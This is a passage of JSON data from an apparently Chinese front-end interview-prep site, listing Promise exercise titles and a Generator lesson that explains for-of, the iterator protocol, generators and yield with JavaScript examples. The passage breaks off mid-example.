ad8-274c-4830-aee9-6799d6a7fdc1\",\"a2c0b41f-1a7e-478b-9e0f-eba7e31a0b2c\",\"a7ccbacc-5415-4c3f-b168-5fcc4d7792ee\",\"c3d12ae7-e074-4072-a07a-aad43ec87e94\",\"1b7efa22-c54d-4dc9-a54e-7faa69f5b821\",\"db6857d7-1559-4abe-816d-545b9be4e05e\",\"3c969c35-6d25-4932-977e-d9ba31000ccd\",\"7579cdab-94b8-4a25-ab87-77569bb7d86d\",\"214b0a32-c111-4c6c-aad6-4ecc14bd904a\",\"c363d879-8557-486c-89ef-2a0e02d2164e\",\"4d19c9e2-7a80-40fd-83ee-ae6d9b531a0a\",\"bff513af-f95f-481f-8bda-03f3515d0e08\",\"154d4288-8195-4fd4-87bb-2844cb22a4e5\"]",
    "vipLimit": 1,
    "level": 3.5,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:36:51.000Z",
    "updateAt": "2025-01-07T12:24:57.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "023f27d0-f90b-446d-bd6c-293e95f9c9b8",
        "title": "【Promise第21题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:51:25.000Z",
        "updateAt": "2023-03-26T08:41:30.000Z"
      },
      {
        "exerciseKey": "090868ab-fef9-4759-8b81-20708a165fa1",
        "title": "【Promise第19题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:48:36.000Z",
        "updateAt": "2022-01-09T23:01:52.000Z"
      },
      {
        "exerciseKey": "13146206-837d-4eb6-9d47-c7152c4dae46",
        "title": "手写实现 Promise.allSettled",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:03:23.000Z"
      },
      {
        "exerciseKey": "154d4288-8195-4fd4-87bb-2844cb22a4e5",
        "title": "Promise中的值穿透是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-11T12:31:41.000Z",
        "updateAt": "2021-08-15T15:28:44.000Z"
      },
      {
        "exerciseKey": "1b41e9cc-194a-4e0c-8bc5-17a83af9abad",
        "title": "【Promise第15题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:42:40.000Z",
        "updateAt": "2022-01-09T23:01:30.000Z"
      },
      {
        "exerciseKey": "1b7efa22-c54d-4dc9-a54e-7faa69f5b821",
        "title": "【Promise第六题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:28:48.000Z",
        "updateAt": "2022-01-09T23:00:41.000Z"
      },
      {
        "exerciseKey": "1bdd3e29-f9b2-4f1d-a8b2-6a8b14320779",
        "title": "Promise 构造函数是同步执行还是异步执行，那么 then 方法呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:41:58.000Z"
      },
      {
        "exerciseKey": "214b0a32-c111-4c6c-aad6-4ecc14bd904a",
        "title": "【Promise第三题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:17:13.000Z",
        "updateAt": "2022-01-09T22:20:37.000Z"
      },
      {
        "exerciseKey": "26bf47fe-07e4-4014-b3ea-8a745f70d718",
        "title": "【Promise第35题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:16:44.000Z",
        "updateAt": "2022-01-09T23:23:51.000Z"
      },
      {
        "exerciseKey": "2b7bc012-86d2-405a-8a26-778f5f1b6dfe",
        "title": "【Promise第28题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:06:40.000Z",
        "updateAt": "2024-07-20T11:01:19.000Z"
      },
      {
        "exerciseKey": "2c14e603-0e2b-4a05-89b7-d5c45804527a",
        "title": "【Promise第30题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:08:47.000Z",
        "updateAt": "2022-01-09T23:15:15.000Z"
      },
      {
        "exerciseKey": "30dd1b36-496d-4a65-a3e7-75be59b36570",
        "title": "【Promise第17题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:45:20.000Z",
        "updateAt": "2022-01-09T23:01:44.000Z"
      },
      {
        "exerciseKey": "31621982-633a-4254-a1a4-b518f734c674",
        "title": "【Promise第14题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:41:27.000Z",
        "updateAt": "2022-01-09T23:01:26.000Z"
      },
      {
        "exerciseKey": "32b06302-58e6-44df-acb7-6c975dcc2957",
        "title": "【Promise第36题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:17:31.000Z",
        "updateAt": "2022-01-09T23:23:57.000Z"
      },
      {
        "exerciseKey": "3489b960-4172-47f8-9ae2-93616d85009f",
        "title": "【Promise第25题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:00:26.000Z",
        "updateAt": "2022-01-09T23:02:16.000Z"
      },
      {
        "exerciseKey": "34d5eef9-20cb-4aac-b34b-87ab513456a7",
        "title": "你是怎么理解ES6中 Promise的？使用场景有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:37:00.000Z",
        "updateAt": "2024-08-10T17:04:27.000Z"
      },
      {
        "exerciseKey": "3526fff1-d92d-4568-b6dd-549bc6c2a92e",
        "title": "如何让Promise.all在抛出异常后依然有效",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:44:01.000Z",
        "updateAt": "2024-08-10T17:06:55.000Z"
      },
      {
        "exerciseKey": "37a4ad10-3819-4ab3-bb5f-26a6bf1ca07a",
        "title": "【Promise第12题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:39:10.000Z",
        "updateAt": "2022-01-09T23:01:19.000Z"
      },
      {
        "exerciseKey": "3925cf74-ee93-49fd-8896-8bc7221f32a4",
        "title": "promise.catch后面的.then还会执行吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T13:26:36.000Z",
        "updateAt": "2024-07-20T10:36:57.000Z"
      },
      {
        "exerciseKey": "3c969c35-6d25-4932-977e-d9ba31000ccd",
        "title": "【Promise第二题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:18:12.000Z",
        "updateAt": "2022-01-09T22:26:13.000Z"
      },
      {
        "exerciseKey": "41c2b7e0-3ab2-4a94-8017-1804b0ddf868",
        "title": "【Promise第39题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:21:20.000Z",
        "updateAt": "2022-01-09T23:24:11.000Z"
      },
      {
        "exerciseKey": "446d36f9-0845-432d-957a-7a9a2997a276",
        "title": "使用Promise实现红绿灯交替重复亮",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:26:04.000Z",
        "updateAt": "2024-03-18T20:33:09.000Z"
      },
      {
        "exerciseKey": "44b5f8c5-1d8c-4294-b668-7f7f096cd44c",
        "title": "【Promise第27题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:05:18.000Z",
        "updateAt": "2022-01-09T23:14:59.000Z"
      },
      {
        "exerciseKey": "462ff8a8-29ba-4e49-88ad-d60e7b3f4ee8",
        "title": "使用Promise实现：限制异步操作的并发个数，并尽可能快的完成全部",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:31:28.000Z",
        "updateAt": "2025-07-18T02:20:36.000Z"
      },
      {
        "exerciseKey": "47240d74-7170-41b6-b85d-2a6977ea9a11",
        "title": "实现有并行限制的Promise调度器",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:15:53.000Z",
        "updateAt": "2021-07-07T00:13:52.000Z"
      },
      {
        "exerciseKey": "4d19c9e2-7a80-40fd-83ee-ae6d9b531a0a",
        "title": "Promise.all 和 Promise.allSettled 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-12T10:20:48.000Z",
        "updateAt": "2024-08-10T17:05:49.000Z"
      },
      {
        "exerciseKey": "52ba6f44-41dd-44cb-a2f4-2dc1589fb02b",
        "title": "【Promise第32题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:10:45.000Z",
        "updateAt": "2022-01-09T23:15:24.000Z"
      },
      {
        "exerciseKey": "5426fc5b-0f7d-4095-98bf-f76016ca090e",
        "title": "如何做 promise 缓存？上一次调用函数的 promise 没有返回， 那么下一次调用函数依然返回上一个 promise",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:17:30.000Z"
      },
      {
        "exerciseKey": "570eed0a-2340-4c59-a6c0-967db6a7dc48",
        "title": "【Promise第38题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:20:04.000Z",
        "updateAt": "2024-07-20T11:01:15.000Z"
      },
      {
        "exerciseKey": "58350841-57d6-4b0a-9e31-57f5f0e16357",
        "title": "【Promise第16题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:44:12.000Z",
        "updateAt": "2022-01-09T23:01:36.000Z"
      },
      {
        "exerciseKey": "584f7b53-5e4b-48b9-ad7b-ae4789647ada",
        "title": "使用Promise封装一个异步加载图片的方法",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:28:57.000Z",
        "updateAt": "2022-01-09T23:31:46.000Z"
      },
      {
        "exerciseKey": "59b71384-0a0a-4d2e-a63a-f4fb75650b60",
        "title": "【Promise第37题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:18:09.000Z",
        "updateAt": "2022-01-09T23:24:02.000Z"
      },
      {
        "exerciseKey": "613e333e-ffca-45ff-a13a-debd8053d913",
        "title": "【Promise第26题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:03:46.000Z",
        "updateAt": "2022-01-09T23:14:53.000Z"
      },
      {
        "exerciseKey": "7579cdab-94b8-4a25-ab87-77569bb7d86d",
        "title": "【Promise第一题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:16:36.000Z",
        "updateAt": "2022-01-09T22:19:07.000Z"
      },
      {
        "exerciseKey": "7a27cdc8-5f66-4cea-8350-c20d0bd2836b",
        "title": "【Promise第20题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:50:07.000Z",
        "updateAt": "2022-01-09T23:01:57.000Z"
      },
      {
        "exerciseKey": "7b82de7c-5c47-4e5a-9630-df2721d17edb",
        "title": "Promise 的 finally 怎么实现的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-28T02:47:20.000Z",
        "updateAt": "2024-07-19T13:41:32.000Z"
      },
      {
        "exerciseKey": "7fdc5ee0-1c5f-483b-927b-140536ea83f2",
        "title": "【Promise第34题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:14:28.000Z",
        "updateAt": "2022-01-09T23:16:01.000Z"
      },
      {
        "exerciseKey": "8169e336-3daa-4e6c-9f85-13c4a9a31467",
        "title": "Promise then 第二个参数和catch的区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-28T02:46:37.000Z",
        "updateAt": "2024-08-10T17:07:25.000Z"
      },
      {
        "exerciseKey": "848cb975-f2e8-4a46-bf55-d36acd6a1a38",
        "title": "promise 是否可以取消？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T18:38:56.000Z"
      },
      {
        "exerciseKey": "9656ede7-6815-4a00-9df3-60c0219e4383",
        "title": "【Promise第22题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:53:20.000Z",
        "updateAt": "2022-01-09T23:02:04.000Z"
      },
      {
        "exerciseKey": "96feb2bc-cdd7-4b16-be8a-e9d5af64a27b",
        "title": "【Promise第29题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:07:25.000Z",
        "updateAt": "2022-01-09T23:15:10.000Z"
      },
      {
        "exerciseKey": "9f0dbfc0-bd61-4956-8093-d604ac401983",
        "title": "实现mergePromise函数",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:27:24.000Z",
        "updateAt": "2024-07-20T11:10:43.000Z"
      },
      {
        "exerciseKey": "a0a7f06f-8aa3-4408-8a40-87c33bd3608f",
        "title": "promise.race、promise.all、promise.allSettled 有哪些区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:02:13.000Z"
      },
      {
        "exerciseKey": "a1902422-cbf4-4551-9f88-891eb1777e8d",
        "title": "【Promise第33题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:13:01.000Z",
        "updateAt": "2022-01-09T23:15:28.000Z"
      },
      {
        "exerciseKey": "a2c0b41f-1a7e-478b-9e0f-eba7e31a0b2c",
        "title": "【Promise第九题】下面两段代码分别输出什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:35:34.000Z",
        "updateAt": "2024-07-20T11:01:40.000Z"
      },
      {
        "exerciseKey": "a7ccbacc-5415-4c3f-b168-5fcc4d7792ee",
        "title": "【Promise第八题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:32:21.000Z",
        "updateAt": "2024-07-20T11:01:43.000Z"
      },
      {
        "exerciseKey": "aaee81ad-a128-4bbf-b60b-aa2c9c3396c3",
        "title": " Promise中，resolve后面的语句是否还会执行？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:25:21.000Z",
        "updateAt": "2024-08-10T17:05:25.000Z"
      },
      {
        "exerciseKey": "bff513af-f95f-481f-8bda-03f3515d0e08",
        "title": "使用Promise实现每隔1秒输出1,2,3",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-11T13:16:40.000Z",
        "updateAt": "2024-07-20T11:58:18.000Z"
      },
      {
        "exerciseKey": "c363d879-8557-486c-89ef-2a0e02d2164e",
        "title": "【Promise第五题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-20T09:47:37.000Z",
        "updateAt": "2022-01-09T22:24:14.000Z"
      },
      {
        "exerciseKey": "c3d12ae7-e074-4072-a07a-aad43ec87e94",
        "title": "【Promise第七题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:30:11.000Z",
        "updateAt": "2022-01-09T23:00:47.000Z"
      },
      {
        "exerciseKey": "c5f7ff93-7de3-4ebd-bfaa-bcaeebcd7f56",
        "title": "Promise then 第二个参数和 Promise.catch 的区别是什么?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:21:48.000Z"
      },
      {
        "exerciseKey": "ced16bc7-215d-47a2-9bef-7e6ab67f303c",
        "title": "【Promise第31题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:09:42.000Z",
        "updateAt": "2022-01-09T23:15:20.000Z"
      },
      {
        "exerciseKey": "d0fd3a52-1ddf-42b2-b9d8-f36fc885d237",
        "title": "说说你对 Promise 的了解？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:01:15.000Z"
      },
      {
        "exerciseKey": "d4b6e13e-5036-4231-bf64-dae0fd27b849",
        "title": "实现 Promise.race 函数",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-10T14:29:16.000Z",
        "updateAt": "2022-05-10T22:33:14.000Z"
      },
      {
        "exerciseKey": "d9a36bb7-972c-4afb-abb6-fcbaa30612cf",
        "title": "【Promise第11题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:38:08.000Z",
        "updateAt": "2024-07-20T11:01:31.000Z"
      },
      {
        "exerciseKey": "db6857d7-1559-4abe-816d-545b9be4e05e",
        "title": "【Promise第四题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:22:13.000Z",
        "updateAt": "2024-07-20T11:01:50.000Z"
      },
      {
        "exerciseKey": "dec780c4-3610-4673-b12f-add388ceec10",
        "title": "【Promise第40题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:23:27.000Z",
        "updateAt": "2024-07-20T11:01:12.000Z"
      },
      {
        "exerciseKey": "e0e3dbcd-2e8a-4756-9241-bbb23af9c2e8",
        "title": "【Promise第18题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:47:19.000Z",
        "updateAt": "2022-01-09T23:01:49.000Z"
      },
      {
        "exerciseKey": "e233c823-d125-4abe-b1da-878751a92cd9",
        "title": "【Promise第23题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:55:21.000Z",
        "updateAt": "2024-07-20T11:01:27.000Z"
      },
      {
        "exerciseKey": "ee457290-82ef-4c2b-b2f1-e6b1b28e9166",
        "title": "如何中断Promise？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-31T08:51:43.000Z",
        "updateAt": "2024-08-10T21:15:44.000Z"
      },
      {
        "exerciseKey": "f1dfb420-8c92-4210-98af-130b79133d82",
        "title": "实现 Promise.all",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:14:34.000Z",
        "updateAt": "2021-08-13T10:14:46.000Z"
      },
      {
        "exerciseKey": "f355de02-e03c-4d97-ac11-cd1de62867ab",
        "title": "async/await、generator、promise 这三者的关联和区别是什么?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:33:11.000Z",
        "updateAt": "2024-08-10T17:07:17.000Z"
      },
      {
        "exerciseKey": "f6f14b00-ae3f-43a9-9085-12333dd0cb8c",
        "title": "【Promise第13题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:40:25.000Z",
        "updateAt": "2022-01-09T23:01:23.000Z"
      },
      {
        "exerciseKey": "f8787bfb-ca4c-4b0f-98d9-4ad5e0a3774d",
        "title": "实现 Promise ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:09:34.000Z",
        "updateAt": "2021-07-07T00:13:30.000Z"
      },
      {
        "exerciseKey": "fa6c1ad8-274c-4830-aee9-6799d6a7fdc1",
        "title": "【Promise第10题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:37:00.000Z",
        "updateAt": "2024-07-20T11:01:35.000Z"
      },
      {
        "exerciseKey": "fa9e9946-de5b-4998-a224-8d512d3ccac2",
        "title": "【Promise第24题】下面代码的输出是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T14:58:41.000Z",
        "updateAt": "2024-07-20T11:01:23.000Z"
      },
      {
        "exerciseKey": "fbcd6444-9c0f-492a-b138-bd205bb4bf1d",
        "title": "async/await 和 Promise 有什么关系？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:29:11.000Z",
        "updateAt": "2024-08-10T21:18:39.000Z"
      }
    ]
  },
  "55": {
    "id": 55,
    "tagId": 24,
    "title": "Generator",
    "explanation": "## 聊聊 `for of`\n\n说起 `for of` 相信每个写过 `JavaScript` 的人都用过 `for of` ，平时我们用它做什么呢？大多数情况应该就是遍历数组了，当然，更多时候，我们也会用 `map()` 或者 `filer()` 来遍历一个数组。 但是就像我们标题里面说的，它跟 `Generator` 能扯上什么关系呢？\n\n首先我们想一个问题，为什么使用 `for of` 或者 `map()`/`filer()` 方法就可以遍历一个数组 (或者类数组对象: `Strings` , `Maps` , `Sets` , `arguments` ) 呢？ 为什么不能用他们来遍历一个对象呢？\n\n## 你能学到什么\n\n-   对 `for of` 更深入的理解\n-   `iterator` 到底是何方神圣?\n-   数组也是对象，为什么不能用 `for of` 来遍历对象呢？\n-   如何实现对象的 `for of`?\n-   `Generator` 又是何方神圣？他有什么用呢？\n\n## 类数组对象的玄机\n\n在真正揭开谜底之前，站在 `for of` 的角度想一下，现在让你去遍历一个数组，你需要知道什么信息呢？\n\n-   对应下标的值\n-   是否遍历结束的标志\n\n带着这样的思考，我们打印一个数组来看看这里面的玄机：\n\n```javascript\nconst numbersArray = [1, 2, 3];\n\nconsole.dir(numbersArray);\n```\n\n![](https://static.ecool.fun//article/3d5af0da-697b-473a-a814-c998754b25e1.png)\n\n数组 (或者类数组对象: `Strings` , `Maps` , `Sets` , `arguments` ) 的原型中都实现了一个方法 `Symbol.iterator`，问题来了，那么这个 `Symbol.iterator` 又有什么用呢？ 拿出来试一下就知道了：\n\n```javascript\nlet iterator = numbersArray[Symbol.iterator]();\n// 我们把这个 Symbol.iterator 打印一下看看里面到底有些什么\nconsole.dir(iterator);\n```\n\n![](https://static.ecool.fun//article/885e7ed9-0bdd-47e3-9e0d-a00c4dbe650a.png)\n\n这里有一个 `next()` 方法对吗？执行这个 `next()` 方法：\n\n```javascript\niterator.next(); // 输出 {value: 1, done: false}\niterator.next(); // 输出 {value: 2, done: false}\niterator.next(); // 输出 {value: 3, done: false}\niterator.next(); // 输出 {value: undefined, done: true}\n```\n\n> 请注意，当下标超出时，value: undefined\n\n我们发现这个 `iterator.next()` 每次都返回了一个对象。这对象包含两个信息：当前下标的值，以及遍历是否结束的标志。这印证了我们之前思考，有了这两个信息，你作为 `for of` 函数，也能打印出数组的每一项了不是吗？\n\n新的问题来了，`iterator` 到底是何方神圣呢？\n\n## `iterator`(迭代器) & `The iterator protocol`（迭代协议）\n\n聊到了 `iterator` 我们不得不先说一下 `The iterator protocol`（迭代协议）\n\n> [\" The iterable protocol allows JavaScript objects to define or customize their iteration behavior \" - MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols \"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols\")\n\nMDN 上是这么说的：`The iterator protocol` 允许 `JavaScript` 对象去定义或定制它们的迭代行为 \b，所以上面出现的 `Symbol.iterator` 这个方法，就是数组对于这个协议的实现。那么按照这个协议，数组是怎么实现了一个 `iterator` 呢？\n\n> [\"In JavaScript an iterator is an object which defines a sequence and potentially a return value upon its termination. More specifically an iterator is any object which implements the Iterator protocol by having a next() method which returns an object with two properties: value, the next value in the sequence; and done, which is true if the last value in the sequence has already been consumed. If value is present alongside done, it is the iterator's return value.\" - MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_generators \"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_generators\")\n\n这一大段看起来比较费劲，简单来说就像我们上一章节所印证的，它实现的方式是定义了一个 `next()` 方法，而这个 `next()` 方法每次被执行都会返回一个对象: `{value:xxx/undefined , done: true/false }` 其中 `value` 代表的是当前遍历到的值，`done` 代表是否遍历结束。\n\n本小节回答了我们之前的提问: 为什么不能用 `for of` 来遍历一个对象呢？ 原因很简单：`JavaScript` 的对象中没有实现一个这样的 `iterator` 。你可以打印一个对象来看看结果如何：\n\n```javascript\nconsole.dir({ a: 1, b: 2 });\n```\n\n![](https://static.ecool.fun//article/9827c107-2bdd-4c1a-bbf7-251aa65b15c3.png)\n\nokay, 到这里如果就结束的话，那我们了解得还不够深入，于是再问一个问题：\n\nWhy is there no built-in object iteration ？ （为什么在 `object` 中没有内置迭代器呢? ）\n\n## 为什么在 `object` 中没有内置迭代器呢?\n\n对啊，为什么呢？ 我们在各样的场景中也需要来遍历一个对象啊？为什么没有内置一个迭代器呢？要回答这个问题，我们得从另外一个角度出发，了解一些基本的概念：\n\n我们常常说遍历对象，但是简单来说，只会在两种层级上来对一个 `JavaScript` 对象进行遍历：\n\n-   程序的层级 - 什么意思呢？在程序层级上，我们对一个对象进行迭代，是在迭代展示其结构的对象属性。 可能还不是很好理解，举个栗子：`Array.prototype.length` 这个属性与对象的结构相关，但却不是它的数据。\n    \n-   数据的层级 - 意味着迭代数据结构并提取它的数据。举个栗子：我们在迭代一个数组的时候，迭代器是对于它的 每一个数据进行迭代，如果 `array = [a, b, c, d]` 那么迭代器访问到的是 `1, 2, 3, 4`。\n    \n\n明白了这个缘由，`JavaScript` 虽然不支持用 `for of` 来遍历对象，但是提供了一个 `for in` 方法来遍历所有非 `Symbol` 类型并且是可枚举的属性。\n\n标准不支持，如果我们就是要用 `for-of` 来遍历对象呢？那我们可以任性的实现一个啊：\n\n```javascript\nObject.prototype[Symbol.iterator] = function*() {\n  for (const [key, value] of Object.entries(this)) {\n    yield { key, value };\n  }\n};\n```\n\n```javascript\nfor (const { key, value } of { a: 1, b: 2, c: 3 }) {\n  console.log(key, value);\n}\n```\n\n不知道你有没有注意一个细节，在我们任性的实现一个 `iterator` 的代码中，我们用到了一个很奇怪的结构 `function*() {}` ，这个就是我们接下来要介绍的 `Generator`\n\n## Generators\n\n看到这个名字觉得很厉害哈，但其实很简单，写一个 `Generator` 你只需要在函数名和 `function` 关键字中间加一个 `*` 号就可以了。至于里面的 `yield` 是什么，后面会说的。\n\n`talk is cheap , show me the code` ,用一个例子，简单说一下概念。\n\n我们现在定义了一个这样的 `Generator` 叫做 `gen`\n\n```javascript\nfunction* gen() {\n  yield 1;\n  yield 2;\n  yield 3;\n  yield 4;\n}\n```\n\n我们只能看到，这里面有 4 个语句，那打印一下看看呗：\n\n![](https://static.ecool.fun//article/373078bc-348b-4d9b-844b-917345ff507c.png)\n\n这里发现了一个熟悉的函数，`next()` 方法，我们把 `gen` 实例化一下，执行一下它的 `next()` 来看看结果：\n\n![](https://static.ecool.fun//article/c28c5111-3960-4d4c-9d4e-2e969f397cb9.png)\n\n还是熟悉的味道，那么到这里，我们已经知道，`Generator` 可以实例化出一个 `iterator` ，并且这个 `yield` 语句就是用来中断代码的执行的，也就是说，配合 `next()` 方法，每次只会执行一个 `yield` 语句。\n\n多说一句，针对 `Generator` 本身，还有一个有意思的特性，`yield` 后面可以跟上另一个 `Generator` 并且他们会按照次序执行：\n\n```javascript\nfunction* gen() {\n  yield 1;\n  yield* gen2();\n  return;\n}\n\nfunction* gen2() {\n  yield 4;\n  yield 5;\n}\n\nlet iterator = gen();\nconsole.log(iterator.next());\nconsole.log(iterator.next());\nconsole.log(iterator.next());\nconsole.log(iterator.next());\n```\n\n![](https://static.ecool.fun//article/9661dcec-13c5-42f7-8ff4-701f117b2fce.png)\n\n结果很有意思不是吗？而且 `return` 会终结整个 `Generator` ，换句话说：写在 `return` 后面的 `yield` 不会执行。\n\n## Generator 有什么用?\n\n`Generator` 有什么用? 聪明的同学可能已经猜到了，是的，它能够中断执行代码的特性，可以帮助我们来控制异步代码的执行顺序：\n\n例如有两个异步的函数 `A` 和 `B`, 并且 `B` 的参数是 `A` 的返回值，也就是说，如果 `A` 没有执行结束，我们不能执行 `B`。\n\n那这时候我们写一段伪代码：\n\n```javascript\nfunction* effect() {\n  const { param } = yield A();\n  const { result } = yield B(param);\n  console.table(result);\n}\n```\n\n这时候我们如果需要得到 `result` 那么我们就需要:\n\n```javascript\nconst iterator = effect()\niterator.next()\niterator.next()\n```\n\n执行两次 `next()` 得到结果，看起来很傻不是吗？有没有好的办法呢？（废话，肯定有啊） 假设你在每次执行 `A()` / `B()` 的请求结束之后，都会自动执行 `next()` 方法呢。\n\n",
    "testPoint": "### **1. `Generator` 函数的定义与语法**\n**Generator** 函数是通过 `function*` 语法定义的，它返回一个 **迭代器**，可以通过 `yield` 语句控制函数的执行。\n\n**考察点**：\n- 如何定义一个 **Generator** 函数？\n- `yield` 关键字的作用是什么？\n- `Generator` 函数与普通函数的区别。\n  \n**示例问题**：\n- 如何定义一个 **Generator** 函数？\n- `function*` 和 `function` 有什么区别？\n  \n**代码示例**：\n```javascript\n// Generator 函数的定义\nfunction* myGenerator() {\n  yield 1;\n  yield 2;\n  yield 3;\n}\n\nconst gen = myGenerator();\nconsole.log(gen.next()); // { value: 1, done: false }\nconsole.log(gen.next()); // { value: 2, done: false }\nconsole.log(gen.next()); // { value: 3, done: false }\nconsole.log(gen.next()); // { value: undefined, done: true }\n```\n\n---\n\n### **2. `yield` 的用法**\n**`yield`** 是 **Generator** 函数中的核心关键字，用于暂停和恢复函数的执行。它可以接收一个值并将其返回给外部，执行到 `yield` 时，函数会暂停，直到调用 `next()` 方法恢复执行。\n\n**考察点**：\n- `yield` 语句如何在 **Generator** 函数中使用。\n- **Generator** 函数暂停与恢复执行的机制。\n- `yield` 的返回值和 `next()` 方法的返回值。\n\n**示例问题**：\n- `yield` 语句是如何工作的？它在 **Generator** 中的作用是什么？\n- `yield` 和 `return` 有什么区别？\n\n**代码示例**：\n```javascript\nfunction* numberGenerator() {\n  yield 1;\n  yield 2;\n  return 3;\n}\n\nconst gen = numberGenerator();\nconsole.log(gen.next()); // { value: 1, done: false }\nconsole.log(gen.next()); // { value: 2, done: false }\nconsole.log(gen.next()); // { value: 3, done: true }\nconsole.log(gen.next()); // { value: undefined, done: true 